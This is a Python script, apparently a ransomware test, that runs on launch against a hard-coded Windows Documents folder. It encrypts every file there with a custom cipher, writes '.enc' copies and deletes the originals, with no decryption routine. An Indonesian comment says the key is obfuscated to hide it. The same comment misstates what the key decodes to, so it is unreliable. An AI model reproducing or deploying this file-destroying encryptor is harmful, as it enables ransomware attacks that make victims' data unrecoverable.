import os
import hashlib

def derive_subkeys(key):
    h = hashlib.sha256(key).digest()
    xor_key = h[:16]
    shift_key = int.from_bytes(h[16:20], 'big') % 8
    perm_key = list(range(256))
    j = 0
    for i in range(256):
        j = (j + perm_key[i] + h[i % len(h)]) % 256
        perm_key[i], perm_key[j] = perm_key[j], perm_key[i]
    return xor_key, shift_key, perm_key

def custom_encrypt(data: bytes, key: bytes) -> bytes:
    xor_key, shift_key, perm_key = derive_subkeys(key)
    encrypted = bytearray(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data))
    encrypted = bytearray(((b << shift_key) | (b >> (8 - shift_key))) & 0xFF for b in encrypted)
    return bytes(perm_key[b] for b in encrypted)

def process_path(path: str, key: bytes, mode: str = 'encrypt'):
    ext = '.enc'
    path = os.path.normpath(path)
    if os.path.isfile(path):
        try:
            with open(path, 'rb') as f:
                data = f.read()
            processed = custom_encrypt(data, key)
            outpath = path + ext
            with open(outpath, 'wb') as f:
                f.write(processed)
            os.remove(path)
            print(f"ENCRYPTED: {path} -> {outpath}")
        except Exception as e:
            print(f"FAILED: {path} | {e}")
    elif os.path.isdir(path):
        print(f"Processing folder: {path}")
        for root, _, files in os.walk(path, topdown=False):
            for file in files:
                filepath = os.path.join(root, file)
                try:
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    processed = custom_encrypt(data, key)
                    outpath = filepath + ext
                    with open(outpath, 'wb') as f:
                        f.write(processed)
                    os.remove(filepath)
                    print(f"ENCRYPTED: {filepath}")
                except Exception as e:
                    print(f"FAILED: {filepath} | {e}")
    else:
        print(f"Path not found: {path}")

# === OTOMATIS EKSEKUSI ===
if __name__ == "__main__":
    # Key "jancoks123" di-hardcode tapi di-obfuscate sedikit biar ga keliatan plain
    hidden_key = b''.join(bytes([ord(c) ^ 0x13]) for c in "kZ]VTLR^PVW")  # hasil XOR 0x13 dari "jancoks123"
    target_path = r"C:\Users\SRA90002045\Documents\tesransom"
    
    print("Starting encryption...")
    process_path(target_path, hidden_key, 'encrypt')
    print("Encryption complete.")
